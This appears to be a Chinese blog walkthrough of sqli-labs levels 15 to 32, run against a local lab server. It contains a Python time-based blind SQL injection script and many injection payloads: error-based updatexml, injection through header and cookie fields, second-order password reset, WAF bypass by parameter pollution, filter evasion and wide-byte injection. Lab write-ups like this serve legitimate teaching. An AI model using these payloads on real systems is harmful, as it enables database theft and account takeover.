<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">看一下脚本</span><br><span class="line">- 脚本跑</span><br><span class="line"> 理解扫描的方式： 确定数据库的数量，确定数据库的长度，确定数据库</span><br><span class="line"> 我们可以通过大于数据库的个数这样就不用去判断数据库的长度，之后长度也可以通过时间报错信息去判断，在加上判断 是否是这个字符 一共需要三层循环就可以解决</span><br><span class="line">  这里有两种方式去判断 ，使用ascii判断 ，或者通过mid 截断去判断。</span><br><span class="line"></span><br><span class="line">#coding:utf-8</span><br><span class="line">import requests</span><br><span class="line">from time import time</span><br><span class="line">url = &quot;http://192.168.64.135/Less-15/&quot;</span><br><span class="line">char = &quot;abcdefghijklmnopqrstuvwxyz_&quot;</span><br><span class="line">print(&quot;start!&quot;)</span><br><span class="line">for i in range(0,10):</span><br><span class="line">    database = &quot;&quot;</span><br><span class="line">    for j in range(1,20):</span><br><span class="line">        for str in char:</span><br><span class="line"></span><br><span class="line">            time1 = time()</span><br><span class="line">            data = &#123;&apos;uname&apos;:&quot;admin&apos;and If((mid((select schema_name from information_schema.schemata limit %d,1),%d,1))=&apos;%s&apos;,sleep(0.1),1)#&quot;%(i,j,str),&apos;passwd&apos;:&quot;1&quot;&#125;</span><br><span class="line">            res = requests.post(url,data=data)</span><br><span class="line"></span><br><span class="line">            time2 = time()</span><br><span class="line"></span><br><span class="line">            if (time2-time1 &gt; 0.1 ):</span><br><span class="line">                database += str</span><br><span class="line">                #print(database)</span><br><span class="line">                break</span><br><span class="line">    print(&quot;the %d database: &quot;% (i+1))</span><br><span class="line">    print(database)</span><br><span class="line">print(&quot;end!&quot;)</span><br></pre></td></tr></table></figure>

<h2 id="Less-16-post方法双引号括号绕过时间盲"><a href="#Less-16-post方法双引号括号绕过时间盲" class="headerlink" title="Less-16 post方法双引号括号绕过时间盲"></a>Less-16 post方法双引号括号绕过时间盲</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">嗯 。。。 和上一关就一个单引号和双引号之差</span><br><span class="line">修改admin&apos; 为 admin &quot;)</span><br></pre></td></tr></table></figure>

<h2 id="Less-17-基于错误的更新查询POST注入"><a href="#Less-17-基于错误的更新查询POST注入" class="headerlink" title="Less-17 基于错误的更新查询POST注入"></a>Less-17 基于错误的更新查询POST注入</h2><p><strong>注意 ，如果注入不当，可能导致user的表被清空</strong></p>
<p>这道题的源码还是要好好看看的,发现存在update ，所以 这道题要小心，避免错误的删除数据</p>
<p><img src="https://upload-images.jianshu.io/upload_images/18851353-07939af280cb6674?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="在这里插入图片描述"></p>
<p>而且 这道题对于uname检查严格，但是password没有检查，所以我们的注入点就限制在了password</p>
<p><img src="https://upload-images.jianshu.io/upload_images/18851353-16be4f7abbc1d5d8?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="在这里插入图片描述"></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">注意 如果使用不当，</span><br><span class="line">这里可以使用updatexml进行注入</span><br><span class="line">updatexml用法 ： updatexml(1,concat(0x7e,(SELECT 查询语句),0x7e),1) </span><br><span class="line">测试发现注入点在password处 uname 过滤了很多，所以从password处出发</span><br><span class="line">1&apos; and updatexml(1,concat(0x7e,(SELECT @@version),0x7e),1)#</span><br><span class="line">之后只要在@@version 处添加合适的查询语句就可以构成注入</span><br></pre></td></tr></table></figure>

<p><img src="https://upload-images.jianshu.io/upload_images/18851353-9421dfa38088ef83?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="在这里插入图片描述"></p>
<h2 id="Less-18-基于错误的用户代理，头部POST注入"><a href="#Less-18-基于错误的用户代理，头部POST注入" class="headerlink" title="Less-18 基于错误的用户代理，头部POST注入"></a>Less-18 基于错误的用户代理，头部POST注入</h2><p>为何host头存在注入，这个也比较少见，但是知道只要和数据库有交互就有可能存在注入</p>
<p>插入了ua头，所以可以从这里下手</p>
<p><img src="https://upload-images.jianshu.io/upload_images/18851353-a92e59ad22107b80?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="在这里插入图片描述"></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">可以看到uname和passwd都进行了过滤，这里有个注意点，在平常的渗透中，当输入点没有注入，可以想想是否在其他地方有注入，程序员对于普通用户的输入点过滤严格，但是其他地方却没有进行过滤，导致了注入的发生，也是需要我们多多注意</span><br></pre></td></tr></table></figure>

<p><img src="https://upload-images.jianshu.io/upload_images/18851353-7eee6334be843421.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="在这里插入图片描述"></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">这里考察 host头部注入，一般相对于参数比较难以查找，也不容易判断，一般判断的方式是通过模糊测试去尝试，或者在可能出现注入的地方添加* 通过sqlmap去测试。</span><br><span class="line">而且要善于去发现页面返回的信息，也许这都是与数据库有交互的点。</span><br><span class="line"></span><br><span class="line">这道题返回的信息有host和ua ，那么我们可以通过给这两个地方加* 放进sqlmap去测试，或者加点查看是否出现报错</span><br><span class="line">通过测试发现在ua处加&apos;返回了错误提示，那么我们就尝试从这里拿下</span><br><span class="line">&apos; and &apos;1=&apos;1 # 闭合 所以接下来就是在这里通过查询语句获取flag了</span><br><span class="line">&apos; and updatexml(1,concat(0x7e,(select @@version),0x7e),1) and &apos;1&apos;=&apos;1 // 查询版本信息</span><br></pre></td></tr></table></figure>

<p>如何查询呢，需要使用到burp 抓包 ，挂上代理，burp抓包发送到 repeater去查看<br><img src="https://upload-images.jianshu.io/upload_images/18851353-07e7489fb48fda14?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="在这里插入图片描述"></p>
<h2 id="Less-19-基于头部的RefererPOST报错注入"><a href="#Less-19-基于头部的RefererPOST报错注入" class="headerlink" title="Less-19 基于头部的RefererPOST报错注入"></a>Less-19 基于头部的RefererPOST报错注入</h2><p>看一下源码，对于referer插入了sql语句，并且没有进行过滤，这就导致了注入</p>
<p><img src="https://upload-images.jianshu.io/upload_images/18851353-fd4b70b9b45e8664?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="在这里插入图片描述"></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">与上题类似，通过返回值判断注入，猜想可能发生在referer处</span><br><span class="line">测试语句与less-18类似</span><br><span class="line">&apos; and updatexml(1,concat(0x7e,(select @@version),0x7e),1) and &apos;1&apos;=&apos;1 // 查询版本信息</span><br><span class="line">发现闭合 成功注入</span><br></pre></td></tr></table></figure>

<h2 id="Less-20-基于错误的cookie头部POST注入"><a href="#Less-20-基于错误的cookie头部POST注入" class="headerlink" title="Less-20 基于错误的cookie头部POST注入"></a>Less-20 基于错误的cookie头部POST注入</h2><p><img src="https://upload-images.jianshu.io/upload_images/18851353-d17944393cc5272f?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="在这里插入图片描述"></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">这里可以看到对于cookie没有进行过滤，并且第二次会拿出cookie调用sql语句，这里就达成了注入的条件。</span><br><span class="line">登录成功之后会设置里面的cookie 当二次刷新的时候 这时候会重新从里面取值弄，并且这次取值没有经过过滤 直接就是注入点 还是使用updatexml的函数进行报错 </span><br><span class="line"></span><br><span class="line">Cookie: uname=admin1 &apos; or updatexml(0,concat(0x5e24,user(),0x5e24)</span><br><span class="line">Cookie: uname=admin&apos; and updatexml(1,concat(0x7e,(select @@version),0x7e),1) #</span><br><span class="line">成功绕过，注入成功</span><br></pre></td></tr></table></figure>

<p>从21开始就添加了比较复杂的过滤，让我们拭目以待。</p>
<h2 id="Less-21-基于错误的复杂的字符型Cookie注入"><a href="#Less-21-基于错误的复杂的字符型Cookie注入" class="headerlink" title="Less-21 基于错误的复杂的字符型Cookie注入"></a>Less-21 基于错误的复杂的字符型Cookie注入</h2><p><img src="https://upload-images.jianshu.io/upload_images/18851353-d2fffea81302ca78?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="在这里插入图片描述"></p>
<p>可以看到 cookie没有进行检测过滤，base编码后就进行了查询</p>
<p>使用sqlmap 注入 ，一定要记得添加编码方式，不然检测不出来</p>
<p><img src="https://upload-images.jianshu.io/upload_images/18851353-9d5edb63c0a5fa22?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="在这里插入图片描述"></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">这一题和上一题类似，只是对cookie进行了base64编码，使用sqlmap的 tamper可以绕过</span><br><span class="line">手工测试和20题一样，将20题的payload进行base64编码即可</span><br><span class="line">但是发现#编码后执行失败，换用&apos;1&apos;=&apos;1闭合语句</span><br><span class="line">admin&apos; and updatexml(1,concat(0x7e,(select @@version),0x7e),1) and &apos;1&apos;=&apos;1</span><br><span class="line">YWRtaW4nIGFuZCB1cGRhdGV4bWwoMSxjb25jYXQoMHg3ZSwoc2VsZWN0IEBAdmVyc2lvbiksMHg3ZSksMSkgYW5kICcxJz0nMQ==</span><br></pre></td></tr></table></figure>

<h2 id="Less-22-基于错误的双引号字符型Cookie注入"><a href="#Less-22-基于错误的双引号字符型Cookie注入" class="headerlink" title="Less-22 基于错误的双引号字符型Cookie注入)"></a>Less-22 基于错误的双引号字符型Cookie注入)</h2><p>查看源码，和21只有这一个区别。</p>
<p><img src="https://upload-images.jianshu.io/upload_images/18851353-e633510cb666ec4c.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="在这里插入图片描述"></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">这里闭合需要&quot;去闭合，将单引号换成双引号 成功绕过</span><br><span class="line">admin&quot; and updatexml(1,concat(0x7e,(select @@version),0x7e),1) and &quot;1&quot;=&quot;1</span><br><span class="line">YWRtaW4iIGFuZCB1cGRhdGV4bWwoMSxjb25jYXQoMHg3ZSwoc2VsZWN0IEBAdmVyc2lvbiksMHg3ZSksMSkgYW5kICIxIj0iMQo%3d</span><br></pre></td></tr></table></figure>

<p><img src="https://upload-images.jianshu.io/upload_images/18851353-99cbf6118231d863?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="在这里插入图片描述"></p>
<h2 id="Less-23-基于错误的，过滤注释的GET型"><a href="#Less-23-基于错误的，过滤注释的GET型" class="headerlink" title="Less-23 基于错误的，过滤注释的GET型"></a>Less-23 基于错误的，过滤注释的GET型</h2><p>分析源码</p>
<p><img src="https://upload-images.jianshu.io/upload_images/18851353-68042f32e4668c3a?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="在这里插入图片描述"></p>
<p>对id进行了两次过滤，#和–+被过滤，</p>
<p>这里可以通过 or ‘1’=‘1 来代替注释符，另一种做法是通过union联合查询，添加到语句中间，然后闭合后面的单引号就可以正常的查询了</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">通过union 查询，在3处闭合 将查询语句写入</span><br><span class="line">-1&apos; union all select 1,group_concat(table_name) from information_schema.tables where table_schema=database(),&apos;3</span><br><span class="line">另一个方式</span><br><span class="line">-1&apos; union all select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database() and &apos;1&apos;=&apos;1</span><br></pre></td></tr></table></figure>

<h2 id="Less-24-二次注入"><a href="#Less-24-二次注入" class="headerlink" title="Less-24 二次注入"></a>Less-24 二次注入</h2><p>拿到这道题，可能和之前的有些许区别，主要这道题注入点不在前端，而是因为数据在二次调用的时候没有过滤，导致了用户通过构造payload绕过去修改其他用户的密码</p>
<p>查看源码，可以看到对于username没有过滤，直接引用了，导致构造的用户修改密码时修改其他用户的密码，并且不需要curr_pass</p>
<p><img src="https://upload-images.jianshu.io/upload_images/18851353-505a511e368bdeb9?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="在这里插入图片描述"></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">构造payload admin&apos;# 即可闭合sql语句 使得password=$curr_pass不起作用</span><br><span class="line">首先创建用户 admin&apos;# 登录此用户，之后修改密码，修改后尝试登录admin用户，发现登录成功。</span><br></pre></td></tr></table></figure>

<h2 id="Less-25-过滤了or和and"><a href="#Less-25-过滤了or和and" class="headerlink" title="Less-25 过滤了or和and"></a>Less-25 过滤了or和and</h2><p>看看源码，函数对于id进行了替换，or和and ，基本可以使得大多注入语句失效</p>
<p><img src="https://upload-images.jianshu.io/upload_images/18851353-865eb5769a13a3aa.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="在这里插入图片描述"></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">尝试输入注入语句，发现当输入or 或者 and的时候被过滤，可能是黑名单绕过</span><br><span class="line">Hint: Your Input is Filtered with following result: 1 1=1</span><br><span class="line">尝试双写 发现绕过过滤，</span><br><span class="line">-1&apos; anandd updatexml(1,concat(0x7e,(select database()),0x7e),1) %23</span><br><span class="line">将and和or 换成 &amp;&amp; 和 || 同样可以绕过</span><br><span class="line"></span><br><span class="line">这道题还有个25a 过滤了or和and的盲注</span><br><span class="line">我们可以直接这样注入</span><br><span class="line">-1 union select 1,2,group_concat(schema_name) from infoorrmation_schema.schemata %23</span><br></pre></td></tr></table></figure>

<p><img src="https://upload-images.jianshu.io/upload_images/18851353-dc051cc8cfd2d902?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="在这里插入图片描述"></p>
<h2 id="Less-26-过滤了注释和空格的注入"><a href="#Less-26-过滤了注释和空格的注入" class="headerlink" title="Less-26 过滤了注释和空格的注入"></a>Less-26 过滤了注释和空格的注入</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">查看源码</span><br><span class="line">function blacklist($id)</span><br><span class="line">&#123;</span><br><span class="line">	$id= preg_replace(&apos;/or/i&apos;,&quot;&quot;, $id);			//strip out OR (non case sensitive)</span><br><span class="line">	$id= preg_replace(&apos;/and/i&apos;,&quot;&quot;, $id);		//Strip out AND (non case sensitive)</span><br><span class="line">	$id= preg_replace(&apos;/[\/\*]/&apos;,&quot;&quot;, $id);		//strip out /*</span><br><span class="line">	$id= preg_replace(&apos;/[--]/&apos;,&quot;&quot;, $id);		//Strip out --</span><br><span class="line">	$id= preg_replace(&apos;/[#]/&apos;,&quot;&quot;, $id);			//Strip out #</span><br><span class="line">	$id= preg_replace(&apos;/[\s]/&apos;,&quot;&quot;, $id);		//Strip out spaces</span><br><span class="line">	$id= preg_replace(&apos;/[\/\\\\]/&apos;,&quot;&quot;, $id);		//Strip out slashes</span><br><span class="line">	return $id;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">空格和注释无法使用</span><br><span class="line">绕过空格的几种</span><br><span class="line">%09 tab键 %0a 新建一行 %0c 新的一页 %od return功能 %0b tab键垂直 %a0 空格</span><br><span class="line"></span><br><span class="line">用%A0替代空格使用，用&amp;&amp;(%26%26)替代AND使用</span><br><span class="line">构造payload： 0&apos;%A0UNION%A0SELECT%A01,version(),database()%26%26%a0&apos;1</span><br><span class="line">这道题还可以使用盲注实现</span><br><span class="line">0&apos;||left(database(),1)=&apos;s&apos;%26%26&apos;1&apos;=&apos;1</span><br><span class="line">同样报错注入也可以实现</span><br><span class="line">0&apos;||updatexml(1,concat(0x7e,(Select%0a@@version),0x7e),1)||&apos;1&apos;=&apos;1</span><br><span class="line"></span><br><span class="line">只要将空格和and绕过 那么实现就简单了</span><br><span class="line">or和and 很好过滤，注释过滤了就使用永真闭合，</span><br></pre></td></tr></table></figure>

<p><img src="https://upload-images.jianshu.io/upload_images/18851353-82c9f75c78a67be7?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="在这里插入图片描述"></p>
<h2 id="Less-26a-过滤了空格和注释的盲注"><a href="#Less-26a-过滤了空格和注释的盲注" class="headerlink" title="Less-26a 过滤了空格和注释的盲注"></a>Less-26a 过滤了空格和注释的盲注</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">和上一题区别不大</span><br><span class="line">通过检测 0&apos;||&apos;1&apos;=&apos;1 判断是&apos;</span><br><span class="line">也可以通过fuzz去查看 发现 &apos;） &quot;) 无报错</span><br><span class="line">使用盲注ok</span><br><span class="line"></span><br><span class="line">0&apos;||left(database(),1)&gt;&apos;s&apos;%26%26&apos;1&apos;=&apos;1</span><br><span class="line"></span><br><span class="line">尝试绕过，这两个都可以绕过</span><br><span class="line">0&apos;)%a0union%a0select%a01,2,3||(&apos;1</span><br><span class="line">0&apos;)%a0union%a0select%a01,2,3;%00</span><br><span class="line">虽然这道题说是盲注，但是通过闭合 也可以直接爆出结果。</span><br></pre></td></tr></table></figure>

<p><img src="https://upload-images.jianshu.io/upload_images/18851353-4f51efa3b34eedc9?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="在这里插入图片描述"></p>
<h2 id="Less-27-过滤了union和select"><a href="#Less-27-过滤了union和select" class="headerlink" title="Less-27 过滤了union和select"></a>Less-27 过滤了union和select</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">做了这么多了，下来就不说如何拿到数据了，重点在于如何绕过，只要能够找到注入点，剩下的可以利用sqlmap 等等工具直接利用，毕竟在渗透中，没有那么多的时间让我们去消耗</span><br><span class="line"></span><br><span class="line">过滤了union和select</span><br><span class="line">绕过方式：双写 大小写</span><br><span class="line">0&apos;%0aUnioN%0aSeleCT%0a1,2,3;%00</span><br><span class="line">0&apos;%A0UnIoN%A0SeLeCt(1),2,3%26%26%a0&apos;1</span><br><span class="line"></span><br><span class="line">这里说明一下，冒号可以做闭合用， %00用来截断 这样和注释有相同的含义，这下绕过就多了：注释，分号闭合，冒号%00截断</span><br></pre></td></tr></table></figure>

<p><img src="https://upload-images.jianshu.io/upload_images/18851353-9d3e214bd3d2f25d?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="在这里插入图片描述"></p>
<h2 id="Less-27a-过滤了union和select"><a href="#Less-27a-过滤了union和select" class="headerlink" title="Less-27a 过滤了union和select"></a>Less-27a 过滤了union和select</h2><p>看一下源码 ，过滤了常见的几个语句，但是黑名单很好绕的，毕竟没有谁能将所有的都加入其中，这样会影响正常的工作<br><img src="https://upload-images.jianshu.io/upload_images/18851353-dab71ae33a04429f?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="在这里插入图片描述"></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">和上一题一样，但是把单引号换成了双引号</span><br><span class="line">替换上一题的payload即可绕过</span><br><span class="line"></span><br><span class="line">0&quot;%0aUNion%0aseLEct%0a1,2,3%26%26%0a&quot;1</span><br><span class="line">0&quot;%0aUNion%0aseLEct%0a1,2,3;%00</span><br></pre></td></tr></table></figure>

<p><img src="https://upload-images.jianshu.io/upload_images/18851353-28cec60cbd23bd84?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="在这里插入图片描述"></p>
<h2 id="Less-28-过滤了union和select大小写"><a href="#Less-28-过滤了union和select大小写" class="headerlink" title="Less-28 过滤了union和select大小写"></a>Less-28 过滤了union和select大小写</h2><p>过滤注释 空格，union 和select在一起的使用<br><img src="https://upload-images.jianshu.io/upload_images/18851353-ec89130d5ef3f833?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="在这里插入图片描述"></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">0&apos;)%A0UnIoN%A0SeLeCt(1),version(),3%26%26%a0(&apos;1</span><br><span class="line">使用盲注也可以达到注入的目录</span><br><span class="line">0&apos;)||left(database(),1)=&apos;s&apos;;%00</span><br></pre></td></tr></table></figure>

<p>但是出现注入的原因是大小写不严格导致 ，mysql语句中，对大小写不敏感，所以单独的过滤某个函数是没有用的， 必须转成小写在判断。这样就可以把大小写给过滤了。</p>
<p><img src="https://upload-images.jianshu.io/upload_images/18851353-43e04f3cd336ac35?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="在这里插入图片描述"></p>
<h2 id="Less-28a盲注-过滤了union和select大小写"><a href="#Less-28a盲注-过滤了union和select大小写" class="headerlink" title="Less-28a盲注 过滤了union和select大小写"></a>Less-28a盲注 过滤了union和select大小写</h2><p>看看源码，过滤不严格，导致了注释可以使用</p>
<p><img src="https://upload-images.jianshu.io/upload_images/18851353-285b146ff755fc72?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="在这里插入图片描述"></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">类似于28 这里可以使用注释</span><br><span class="line">0&apos;)%A0UnIoN%A0SeLeCt(1),version(),database() --+</span><br></pre></td></tr></table></figure>

<p><img src="https://upload-images.jianshu.io/upload_images/18851353-df7c1aa9e0f7c835?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="在这里插入图片描述"></p>
<h2 id="Less-29-获取-基于错误的缺乏证据的不匹配-在web应用程序前面有一个WAF。"><a href="#Less-29-获取-基于错误的缺乏证据的不匹配-在web应用程序前面有一个WAF。" class="headerlink" title="Less-29 获取-基于错误的缺乏证据的不匹配-在web应用程序前面有一个WAF。"></a>Less-29 获取-基于错误的缺乏证据的不匹配-在web应用程序前面有一个WAF。</h2><p>从29关开始，不再是一个index.php文件了<br><img src="https://upload-images.jianshu.io/upload_images/18851353-ecc2e791ef9d09aa.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="在这里插入图片描述"></p>
<p>第一个文件是错误输出显示了</p>
<p><img src="https://upload-images.jianshu.io/upload_images/18851353-1989eb467d5ac1a5?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="在这里插入图片描述"><br>第二个index.php 在熟悉不过了，返回了</p>
<p><img src="https://upload-images.jianshu.io/upload_images/18851353-4e6f88e19d92d921?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="在这里插入图片描述"></p>
<p>第三个是个login.php</p>
<p><img src="https://upload-images.jianshu.io/upload_images/18851353-812f4db35ff71167?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="在这里插入图片描述"></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">简单说一下这道题的原理</span><br><span class="line">这里的waf指的是jsp服务器，这里起到防火墙的作用，数据会经过jsp服务器过滤之后传入php服务器中，php服务器之后将数据返回到jsp服务器，打印到客户端。</span><br><span class="line">这里我们可以传两个参数  id=1&amp;id=2 ，判断是谁获取了第一个值，谁又拿到了第二个值</span><br><span class="line">此处应该是id=2的内容，应为时间上提供服务的是apache（php）服务器，返回的数据也应该是apache处理的数据。而在我们实际应用中，也是有两层服务器的情况，那为什么要这么做？是因为我们往往在tomcat服务器处做数据过滤和处理，功能类似为一个WAF。而正因为解析参数的不同，我们此处可以利用该原理绕过WAF的检测。该用法就是HPP（HTTP Parameter Pollution），http参数污染攻击的一个应用。HPP可对服务器和客户端都能够造成一定的威胁</span><br><span class="line"></span><br><span class="line">payload：0&apos; union all sElect 1,database(),3 --+</span><br></pre></td></tr></table></figure>

<p>首先传入两个参数 id=1 &amp;id=0’ 第二个参数被服务器拿到了，处理然后返回了结果，所以这次注入需要两个参数<br><img src="https://upload-images.jianshu.io/upload_images/18851353-3d5bbf9e43fa32d0?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="在这里插入图片描述"></p>
<p><a href="http://192.168.64.135/Less-29/?id=1&amp;id=0%27%20union%20all%20sElect%201,database(),3%20--+" target="_blank" rel="noopener">http://192.168.64.135/Less-29/?id=1&amp;id=0%27%20union%20all%20sElect%201,database(),3%20--+</a></p>
<p>通过对第二个参数进行注入 成功获取数据</p>
<p><img src="https://upload-images.jianshu.io/upload_images/18851353-af5bb0a6474c5934?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="在这里插入图片描述"></p>
<h2 id="Less-30-盲注-缺乏证据的不匹配-在web应用程序前面有一个WAF。"><a href="#Less-30-盲注-缺乏证据的不匹配-在web应用程序前面有一个WAF。" class="headerlink" title="Less-30 盲注-缺乏证据的不匹配-在web应用程序前面有一个WAF。"></a>Less-30 盲注-缺乏证据的不匹配-在web应用程序前面有一个WAF。</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">测试发现&quot; 报错</span><br><span class="line">0&quot; union select 1,2,database() --+</span><br><span class="line">测试发现上面的同样可以过waf</span><br><span class="line">id=1&amp;id=0&quot; union select 1,2,database() --+</span><br></pre></td></tr></table></figure>

<h2 id="Less-31-盲注-缺乏证据的不匹配-在web应用程序前面有一个WAF。"><a href="#Less-31-盲注-缺乏证据的不匹配-在web应用程序前面有一个WAF。" class="headerlink" title="Less-31  盲注-缺乏证据的不匹配-在web应用程序前面有一个WAF。"></a>Less-31  盲注-缺乏证据的不匹配-在web应用程序前面有一个WAF。</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">判断发现可以通过&quot;) --+ 闭合</span><br><span class="line">id=1&amp;id=0&quot;)  union select 1,2,database() --+</span><br></pre></td></tr></table></figure>

<h2 id="Less-32-一个为危险字符添加斜线的GET-Bypass自定义过滤器"><a href="#Less-32-一个为危险字符添加斜线的GET-Bypass自定义过滤器" class="headerlink" title="Less-32 一个为危险字符添加斜线的GET - Bypass自定义过滤器"></a>Less-32 一个为危险字符添加斜线的GET - Bypass自定义过滤器</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">注释发现 系统会给特殊字符添加转义\</span><br><span class="line">那么我们是否可以编码绕过，发现编码不行</span><br><span class="line">尝试转换成16进制也不ok</span><br><span class="line">百度一下，得到了这道题的做法：宽字节注入，由于数据库编码与前端编码不一致导致存在注入</span><br><span class="line"></span><br><span class="line">汉字是由两个字节编码的，由于gbk和utf-8编码不一致导致报错，为了构成报错，我们需要添加一个大于128的编码</span><br><span class="line"></span><br><span class="line">0%df&apos;  union select 1,database(),3 --+</span><br><span class="line">成功绕过</span><br></pre></td></tr></table></figure>
